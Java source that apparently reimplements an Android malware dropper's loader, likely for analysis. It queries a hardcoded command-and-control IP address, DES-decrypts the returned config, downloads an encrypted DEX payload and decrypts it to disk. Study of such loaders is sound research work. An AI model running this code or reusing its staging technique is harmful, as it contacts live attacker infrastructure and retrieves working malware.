import java.io.*;
import java.lang.reflect.Method;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.Base64;
import java.util.Random;

public class Main {
    private static final String ALPHABET_SEED = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
    private static final int INDEX_DEX_START = 2;
    private static final int INDEX_DEX_STEP = 3;
    private static final int INDEX_DEX_URL = 1;
    private static final int INDEX_ENTRY_CLASS = 4;
    private static final int INDEX_ENTRY_METHOD = 5;
    private static final int INDEX_HOST = 6;
    private static final int INDEX_TAG = 7;
    private static String[] mConfigs;
    private static final String mPkg = "com.pieces.pile.comdy";
    private static File mTargetDex;
    private static File mEncryptedDex;
    private static String mShareKey;
    private static String mIso = "123";
    private static final String SEED = "cWdQfEpRgTrYsUhIiOyPlAmSvDwFtGzHjJkKuLaZbXeCxVnBoNqM";

    public static void loadConfig() throws Exception {
        //for (int i = 202 ; i< 720;i++) {
            String result2 = Http.get("http://3.122.143.26/api/ckwkc2?icc=" + genCode(202)); //
            if (!result2.equals("")) {
                System.out.println("Result from C&C = "  + result2);
                String config2 = new Des(mPkg, mIso).desDecrypt(result2);
                mConfigs = config2.split(config2.substring(0, INDEX_DEX_STEP));
                //System.out.println("countryCode="+i);
                System.out.println("decrypted_config =" + config2);
                Http.download(mConfigs[INDEX_DEX_URL], mEncryptedDex);
                if (mEncryptedDex.exists() && mEncryptedDex.length() > 0) {
                    decryptDex();
                }
            }
        //}
    }

    private static String randomStr(int size) {
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < size; i += INDEX_DEX_URL) {
            sb.append(ALPHABET_SEED.charAt(new Random().nextInt(ALPHABET_SEED.length())));
        }
        return sb.toString();
    }

    private static String genCode(int countryCode) {
        String seed = randomStr(INDEX_DEX_START);
        mIso = String.valueOf(countryCode); // + "755";
            String code = Base64.getEncoder().encodeToString((mPkg + "#" + mIso).getBytes()).trim();
            int index = code.indexOf("=");
            if (index < 0) {
                return code + "0" + seed;
            }

            return code.substring(0, index) + ((code.length() - index) + INDEX_ENTRY_METHOD) + seed;
    }


    public static String a(String str) {
        byte[] bytes = str.getBytes();
        for (int i = 0; i < bytes.length; i++) {
            bytes[i] = (byte) (bytes[i] - 2);
        }
        return new String(bytes);
    }

    public static void decryptDex() {
        int start = Integer.parseInt(mConfigs[INDEX_DEX_START]);
        int step = Integer.parseInt(mConfigs[INDEX_DEX_STEP]);
        BufferedInputStream bis = null;
        BufferedOutputStream bos = null;
        try {
            BufferedInputStream bis2 = new BufferedInputStream(new FileInputStream(mEncryptedDex));
            try {
                BufferedOutputStream bos2 = new BufferedOutputStream(new FileOutputStream(mTargetDex));
                try {
                    byte[] b = new byte[128];
                    while (true) {
                        int len = bis2.read(b);
                        if (len == -1) {
                            close(bis2);
                            close(bos2);
                            return;
                        } else if (len == 128) {
                            bos2.write(b, start, step);
                        } else {
                            bos2.write(b, 0, len);
                        }
                    }
                } catch (Exception e) {
                    bos = bos2;
                    bis = bis2;
                } catch (Throwable th) {
                    bos = bos2;
                    bis = bis2;
                    close(bis);
                    close(bos);
                    throw th;
                }
            } catch (Exception e2) {
                bis = bis2;
                close(bis);
                close(bos);
            } catch (Throwable th2) {
                 bis = bis2;
                close(bis);
                close(bos);
                throw th2;
            }
        } catch (Exception e3) {
            close(bis);
            close(bos);
        } catch (Throwable th3) {
            close(bis);
            close(bos);
            throw th3;
        }
    }

    private static void close(Closeable closeable) {
        if (closeable != null) {
            try {
                closeable.close();
            } catch (Throwable e) {
                e.printStackTrace();
            }
        }
    }
    public static void main(String[] args) throws Exception {
        mShareKey = SEED.substring(INDEX_ENTRY_CLASS, 10);
        System.out.println("ShareKey: " + mShareKey);

        Path currentRelativePath = Paths.get("");
        String s = currentRelativePath.toAbsolutePath().toString();
        System.out.println("Path to files: " + s);
        String filename = SEED.substring(INDEX_DEX_STEP, 9);
        // Create folder for downloads
        s += "\\downloaded";
        File downloadFolder = new File(s);
        boolean dirCreated = downloadFolder.mkdirs();
        System.out.println(s);
        //
        mEncryptedDex = new File(s, filename);
        System.out.println("Encrypted Dex: " + filename);

        filename = SEED.substring(INDEX_TAG, 15);
        mTargetDex = new File(s, filename);
        System.out.println("Decrypted Dex: " + filename);

        loadConfig();
    }
}
